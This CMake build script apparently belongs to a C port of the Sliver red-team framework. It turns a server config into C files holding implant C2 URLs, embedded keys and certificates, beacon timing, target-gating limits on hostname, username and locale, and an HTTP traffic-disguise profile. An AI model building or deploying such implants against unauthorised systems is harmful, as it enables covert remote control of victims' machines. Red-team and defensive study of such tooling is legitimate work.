# SliverConfigGen.cmake
#
# Script mode: converts the server-produced config.json into C artefacts.
# Invoked as:
#   cmake -DCFG_JSON=... -DOUT_DIR=... -DBUILD_SEED=... [-DDEBUG_LOG=1] -P SliverConfigGen.cmake
#
# Outputs (in OUT_DIR):
#   implant_build_config.h  - switches and numeric constants (safe to include everywhere)
#   implant_secrets.c       - names, C2 URLs and key material (single translation unit)

if(NOT DEFINED CFG_JSON OR NOT EXISTS "${CFG_JSON}")
  message(FATAL_ERROR "config json not found: '${CFG_JSON}'")
endif()
if(NOT DEFINED OUT_DIR)
  message(FATAL_ERROR "OUT_DIR is required")
endif()

file(READ "${CFG_JSON}" _json)

function(_cfg_get out key default)
  string(JSON _v ERROR_VARIABLE _err GET "${_json}" "${key}")
  if(_err)
    set(${out} "${default}" PARENT_SCOPE)
  else()
    set(${out} "${_v}" PARENT_SCOPE)
  endif()
endfunction()

# Nested getter: _cfg_get_n(out parent key name default)
function(_cfg_get_n out parent key default)
  string(JSON _v ERROR_VARIABLE _err GET "${_json}" "${parent}" "${key}")
  if(_err)
    set(${out} "${default}" PARENT_SCOPE)
  else()
    set(${out} "${_v}" PARENT_SCOPE)
  endif()
endfunction()

# Array element getter: _cfg_get_ix(out parent key index default)
function(_cfg_get_ix out parent key index default)
  string(JSON _v ERROR_VARIABLE _err GET "${_json}" "${parent}" "${key}" "${index}")
  if(_err)
    set(${out} "${default}" PARENT_SCOPE)
  else()
    set(${out} "${_v}" PARENT_SCOPE)
  endif()
endfunction()

# Array element field getter: _cfg_get_n_ix(out parent key index name default)
function(_cfg_get_n_ix out parent key index name default)
  string(JSON _v ERROR_VARIABLE _err GET "${_json}" "${parent}" "${key}" "${index}" "${name}")
  if(_err)
    set(${out} "${default}" PARENT_SCOPE)
  else()
    set(${out} "${_v}" PARENT_SCOPE)
  endif()
endfunction()

# Escape a value so it can be embedded in a C string literal (PEM blocks,
# JSON fragments, backslashes).
function(_c_escape out input)
  set(_s "${input}")
  string(REPLACE "\\" "\\\\" _s "${_s}")
  string(REPLACE "\"" "\\\"" _s "${_s}")
  string(REPLACE "\r" "" _s "${_s}")
  string(REPLACE "\n" "\\n" _s "${_s}")
  set(${out} "${_s}" PARENT_SCOPE)
endfunction()

_cfg_get(SLIVER_NAME      name       "sliver-implant")
_cfg_get(SLIVER_BUILD_ID  build_id   "dev")
_cfg_get(SLIVER_RECONNECT reconnect_interval_ns "60000000000")
_cfg_get(SLIVER_BINTERVAL beacon_interval_ns    "60000000000")
_cfg_get(SLIVER_BJITTER   beacon_jitter_ns      "0")
_cfg_get(SLIVER_MAXERR    max_connection_errors "1000")
_cfg_get(SLIVER_STRATEGY  strategy   "s")
if(SLIVER_STRATEGY STREQUAL "")
  set(SLIVER_STRATEGY "s")
endif()
_cfg_get(SLIVER_BEACON    beacon     "false")
_cfg_get(SLIVER_POLL      poll_timeout "0")

# string(JSON GET) returns CMake's boolean spelling (ON/OFF) for a JSON boolean,
# not "true"/"false", so compare by CMake truthiness.
set(_beacon 0)
if(SLIVER_BEACON)
  set(_beacon 1)
endif()

# Feature switches: {"features":{"mtls":true,...}}
set(_feat_mtls 0)
set(_feat_http 0)
set(_feat_dns 0)
set(_feat_wg 0)
set(_feat_pivot 0)
string(JSON _has_feat ERROR_VARIABLE _ferr GET "${_json}" features)
if(NOT _ferr)
  foreach(_f IN ITEMS mtls http dns wg pivot)
    string(JSON _v ERROR_VARIABLE _e GET "${_json}" features ${_f})
    if(NOT _e AND _v)
      set(_feat_${_f} 1)
    endif()
  endforeach()
endif()

# C2 URL list
string(JSON _c2_len ERROR_VARIABLE _e2 LENGTH "${_json}" c2)
if(_e2)
  set(_c2_len 0)
endif()

set(_c2_body "")
math(EXPR _c2_last "${_c2_len} - 1")
if(_c2_len GREATER 0)
  foreach(_i RANGE ${_c2_last})
    string(JSON _url GET "${_json}" c2 ${_i} url)
    _c_escape(_url_esc "${_url}")
    string(APPEND _c2_body "  \"${_url_esc}\",\n")
  endforeach()
else()
  string(APPEND _c2_body "  /* no c2 configured */\n")
endif()

# Secrets (order must match sliver_secret_id_t in include/sliver/config.h)
set(_secret_keys
  peer_public_key
  peer_private_key
  peer_public_key_signature
  age_server_public_key
  minisign_server_public_key
  mtls_ca_cert
  mtls_cert
  mtls_key
  wg_implant_priv_key
  wg_server_pub_key
  wg_peer_tun_ip
)
set(_secret_body "")
set(_secret_count 0)
foreach(_k IN LISTS _secret_keys)
  string(JSON _v ERROR_VARIABLE _e GET "${_json}" secrets "${_k}")
  if(_e)
    set(_v "")
  endif()
  _c_escape(_v_esc "${_v}")
  string(APPEND _secret_body "  \"${_v_esc}\",\n")
  math(EXPR _secret_count "${_secret_count} + 1")
endforeach()

# Limits (used by the M2 execution gate)
_cfg_get_n(_lim_host  limits hostname   "")
_cfg_get_n(_lim_user  limits username   "")
_cfg_get_n(_lim_dt    limits datetime   "")
_cfg_get_n(_lim_file  limits file_exists "")
_cfg_get_n(_lim_loc   limits locale     "")

set(_debug 0)
if(DEBUG_LOG)
  set(_debug 1)
endif()

# ---------------------------------------------------------------------------
# HTTP(S) C2 profile. The server always writes the "http" object (see
# server/cppbuild/config.go buildHTTPProfile), but a build may legitimately have
# no HTTP transport at all, so treat it as optional and emit an empty profile.
set(SLIVER_HTTP_PRESENT    0)
set(SLIVER_HTTP_UA         "")
set(SLIVER_HTTP_NONCE      "")
set(SLIVER_HTTP_NONCELEN   0)
set(SLIVER_HTTP_NONCEMODE  "")
set(SLIVER_HTTP_MINPATH    0)
set(SLIVER_HTTP_MAXPATH    0)
set(SLIVER_HTTP_MINFGEN    0)
set(SLIVER_HTTP_MAXFGEN    0)
set(_http_header_body      "")
set(_http_header_count     0)
set(_http_urlparam_body    "")
set(_http_urlparam_count   0)
set(_http_ext_body         "")
set(_http_ext_count        0)
set(_http_seg_body         "")
set(_http_seg_count        0)

string(JSON _http_type ERROR_VARIABLE _http_err TYPE "${_json}" http)
if(NOT _http_err AND NOT _http_type STREQUAL "NULL")
  set(SLIVER_HTTP_PRESENT 1)
  _cfg_get_n(SLIVER_HTTP_UA        http user_agent              "")
  _cfg_get_n(SLIVER_HTTP_NONCE     http nonce_query_arg_chars   "")
  _cfg_get_n(SLIVER_HTTP_NONCELEN  http nonce_query_arg_length  "0")
  _cfg_get_n(SLIVER_HTTP_NONCEMODE http nonce_mode              "")
  _cfg_get_n(SLIVER_HTTP_MINPATH   http min_path_length         "0")
  _cfg_get_n(SLIVER_HTTP_MAXPATH   http max_path_length         "0")
  _cfg_get_n(SLIVER_HTTP_MINFGEN   http min_file_gen            "0")
  _cfg_get_n(SLIVER_HTTP_MAXFGEN   http max_file_gen            "0")
  _c_escape(SLIVER_HTTP_UA        "${SLIVER_HTTP_UA}")
  _c_escape(SLIVER_HTTP_NONCE     "${SLIVER_HTTP_NONCE}")
  _c_escape(SLIVER_HTTP_NONCEMODE "${SLIVER_HTTP_NONCEMODE}")

  string(JSON _http_header_count ERROR_VARIABLE _e LENGTH "${_json}" http headers)
  if(NOT _e AND _http_header_count GREATER 0)
    math(EXPR _hlast "${_http_header_count} - 1")
    foreach(_i RANGE ${_hlast})
      _cfg_get_n_ix(_hm http headers ${_i} method      "")
      _cfg_get_n_ix(_hn http headers ${_i} name        "")
      _cfg_get_n_ix(_hv http headers ${_i} value       "")
      _cfg_get_n_ix(_hp http headers ${_i} probability "0")
      _c_escape(_hm "${_hm}")
      _c_escape(_hn "${_hn}")
      _c_escape(_hv "${_hv}")
      string(APPEND _http_header_body
        "  {\"${_hm}\", \"${_hn}\", \"${_hv}\", ${_hp}},\n")
    endforeach()
  else()
    set(_http_header_count 0)
  endif()

  string(JSON _http_urlparam_count ERROR_VARIABLE _e LENGTH "${_json}" http url_parameters)
  if(NOT _e AND _http_urlparam_count GREATER 0)
    math(EXPR _ulast "${_http_urlparam_count} - 1")
    foreach(_i RANGE ${_ulast})
      _cfg_get_n_ix(_um http url_parameters ${_i} method      "")
      _cfg_get_n_ix(_un http url_parameters ${_i} name        "")
      _cfg_get_n_ix(_uv http url_parameters ${_i} value       "")
      _cfg_get_n_ix(_up http url_parameters ${_i} probability "0")
      _c_escape(_um "${_um}")
      _c_escape(_un "${_un}")
      _c_escape(_uv "${_uv}")
      string(APPEND _http_urlparam_body
        "  {\"${_um}\", \"${_un}\", \"${_uv}\", ${_up}},\n")
    endforeach()
  else()
    set(_http_urlparam_count 0)
  endif()

  string(JSON _http_ext_count ERROR_VARIABLE _e LENGTH "${_json}" http extensions)
  if(NOT _e AND _http_ext_count GREATER 0)
    math(EXPR _elast "${_http_ext_count} - 1")
    foreach(_i RANGE ${_elast})
      _cfg_get_ix(_ev http extensions ${_i} "")
      _c_escape(_ev "${_ev}")
      string(APPEND _http_ext_body "  \"${_ev}\",\n")
    endforeach()
  else()
    set(_http_ext_count 0)
  endif()

  string(JSON _http_seg_count ERROR_VARIABLE _e LENGTH "${_json}" http path_segments)
  if(NOT _e AND _http_seg_count GREATER 0)
    math(EXPR _slast "${_http_seg_count} - 1")
    foreach(_i RANGE ${_slast})
      _cfg_get_n_ix(_si http path_segments ${_i} is_file "false")
      _cfg_get_n_ix(_sv http path_segments ${_i} value   "")
      if(_si STREQUAL "true" OR _si STREQUAL "ON" OR _si STREQUAL "1")
        set(_sib 1)
      else()
        set(_sib 0)
      endif()
      _c_escape(_sv "${_sv}")
      string(APPEND _http_seg_body "  {${_sib}, \"${_sv}\"},\n")
    endforeach()
  else()
    set(_http_seg_count 0)
  endif()
endif()

# ---------------------------------------------------------------------------
file(WRITE "${OUT_DIR}/implant_build_config.h"
"/* Auto-generated by cmake/SliverConfigGen.cmake - do not edit. */
#ifndef SLIVER_BUILD_CONFIG_H
#define SLIVER_BUILD_CONFIG_H

#define SLIVER_IMPLANT_NAME          \"${SLIVER_NAME}\"
#define SLIVER_BUILD_ID              \"${SLIVER_BUILD_ID}\"
#define SLIVER_CONNECTION_STRATEGY   '${SLIVER_STRATEGY}'

#define SLIVER_C2_COUNT              ${_c2_len}
#define SLIVER_SECRET_COUNT          ${_secret_count}

#define SLIVER_RECONNECT_INTERVAL_NS ${SLIVER_RECONNECT}LL
#define SLIVER_BEACON_INTERVAL_NS    ${SLIVER_BINTERVAL}LL
#define SLIVER_BEACON_JITTER_NS      ${SLIVER_BJITTER}LL
#define SLIVER_MAX_CONNECTION_ERRORS ${SLIVER_MAXERR}
#define SLIVER_POLL_TIMEOUT_NS       ${SLIVER_POLL}LL
#define SLIVER_IS_BEACON             ${_beacon}

#define SLIVER_FEATURE_MTLS  ${_feat_mtls}
#define SLIVER_FEATURE_HTTP  ${_feat_http}
#define SLIVER_FEATURE_DNS   ${_feat_dns}
#define SLIVER_FEATURE_WG    ${_feat_wg}
#define SLIVER_FEATURE_PIVOT ${_feat_pivot}

#define SLIVER_LIMIT_HOSTNAME    \"${_lim_host}\"
#define SLIVER_LIMIT_USERNAME    \"${_lim_user}\"
#define SLIVER_LIMIT_DATETIME    \"${_lim_dt}\"
#define SLIVER_LIMIT_FILE_EXISTS \"${_lim_file}\"
#define SLIVER_LIMIT_LOCALE      \"${_lim_loc}\"

#define SLIVER_DEBUG_LOG ${_debug}

/* HTTP(S) C2 profile (see sliver/config.h). Arrays live in implant_http_c2.c. */
#define SLIVER_HTTP_C2_PRESENT       ${SLIVER_HTTP_PRESENT}
#define SLIVER_HTTP_UA               \"${SLIVER_HTTP_UA}\"
#define SLIVER_HTTP_NONCE_CHARS      \"${SLIVER_HTTP_NONCE}\"
#define SLIVER_HTTP_NONCE_LEN        ${SLIVER_HTTP_NONCELEN}
#define SLIVER_HTTP_NONCE_MODE       \"${SLIVER_HTTP_NONCEMODE}\"
#define SLIVER_HTTP_MIN_PATH_LENGTH  ${SLIVER_HTTP_MINPATH}
#define SLIVER_HTTP_MAX_PATH_LENGTH  ${SLIVER_HTTP_MAXPATH}
#define SLIVER_HTTP_MIN_FILE_GEN     ${SLIVER_HTTP_MINFGEN}
#define SLIVER_HTTP_MAX_FILE_GEN     ${SLIVER_HTTP_MAXFGEN}
#define SLIVER_HTTP_HEADER_COUNT     ${_http_header_count}
#define SLIVER_HTTP_URLPARAM_COUNT   ${_http_urlparam_count}
#define SLIVER_HTTP_EXTENSION_COUNT  ${_http_ext_count}
#define SLIVER_HTTP_PATH_SEG_COUNT   ${_http_seg_count}

#endif /* SLIVER_BUILD_CONFIG_H */
")

# HTTP profile data arrays. Kept in their own TU (mirroring implant_secrets.c) so
# the header stays declaration-only and can be included from multiple places.
file(WRITE "${OUT_DIR}/implant_http_c2.c"
"/* Auto-generated by cmake/SliverConfigGen.cmake - do not edit. */
#include <stddef.h>
#include \"sliver/config.h\"

const sliver_http_header_t sliver_http_headers[] = {
${_http_header_body}  {(const char *)NULL, (const char *)NULL, (const char *)NULL, 0}};
const size_t sliver_http_header_count = (size_t)${_http_header_count};

const sliver_http_header_t sliver_http_url_parameters[] = {
${_http_urlparam_body}  {(const char *)NULL, (const char *)NULL, (const char *)NULL, 0}};
const size_t sliver_http_url_parameter_count = (size_t)${_http_urlparam_count};

const char *const sliver_http_extensions[] = {
${_http_ext_body}  (const char *)NULL};
const size_t sliver_http_extension_count = (size_t)${_http_ext_count};

const sliver_http_path_seg_t sliver_http_path_segments[] = {
${_http_seg_body}  {0, (const char *)NULL}};
const size_t sliver_http_path_segment_count = (size_t)${_http_seg_count};
")

file(WRITE "${OUT_DIR}/implant_secrets.c"
"/* Auto-generated by cmake/SliverConfigGen.cmake - do not edit.
 * Sensitive material lives in this single translation unit. */
#include <stddef.h>
#include \"sliver/config.h\"

const char *const sliver_c2_urls[] = {
${_c2_body}};

const size_t sliver_c2_url_count = (size_t)${_c2_len};

/* Order must match sliver_secret_id_t. */
const char *const sliver_secret_values[] = {
${_secret_body}};

const size_t sliver_secret_value_count = (size_t)${_secret_count};

const char *const sliver_implant_name = \"${SLIVER_NAME}\";
const char *const sliver_build_id_string = \"${SLIVER_BUILD_ID}\";
")

message(STATUS "generated implant_build_config.h, implant_secrets.c and implant_http_c2.c in ${OUT_DIR}")
